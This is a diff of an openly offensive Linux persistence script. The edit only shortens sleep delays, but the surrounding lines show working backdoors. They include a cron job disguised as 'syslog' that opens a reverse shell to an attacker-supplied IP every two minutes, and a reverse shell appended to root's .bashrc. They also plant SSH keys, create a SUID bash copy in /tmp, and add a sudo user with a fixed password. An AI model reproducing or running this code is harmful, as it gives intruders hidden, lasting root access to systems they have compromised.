@@ -19,7 +19,7 @@ echo "[💀] Installing persistence..."
 
 read -p "Hacker IP: " IP
 
-sleep 2
+sleep 1
 
 ################################
 #        CRON BACKDOOR         #
@@ -29,7 +29,7 @@ echo "[+] creating cron backdoor"
 
 echo "*/2 * * * * root bash -c 'bash -i >& /dev/tcp/$IP/1337 0>&1'" > /etc/cron.d/syslog
 
-sleep 2
+sleep 1
 
 ################################
 #        ROOT BASHRC           #
@@ -39,7 +39,7 @@ echo "[+] creating bashrc backdoor"
 
 echo "bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1' &" >> /root/.bashrc
 
-sleep 2
+sleep 1
 
 ################################
 #      SSH KEY BACKDOOR        #
@@ -57,7 +57,7 @@ chmod 600 /root/.ssh/authorized_keys
 
 chmod 700 /root/.ssh
 
-sleep 2 
+sleep 1
 
 ################################
 #        SUID SHELL            #
@@ -68,7 +68,7 @@ echo "[+] creating suid shell"
 cp /bin/bash /tmp/rootbash
 chmod +s /tmp/rootbash
 
-sleep 2
+sleep 1
 
 ################################
 #        SYSTEMD SERVICE       #
@@ -108,7 +108,7 @@ usermod -aG sudo sysbackup 2>/dev/null
 
 echo "[+] user created -> sysbackup:Password123!"
 
-sleep 2
+sleep 1
 
 echo "[+] Backdoors installed"
 sleep 1 
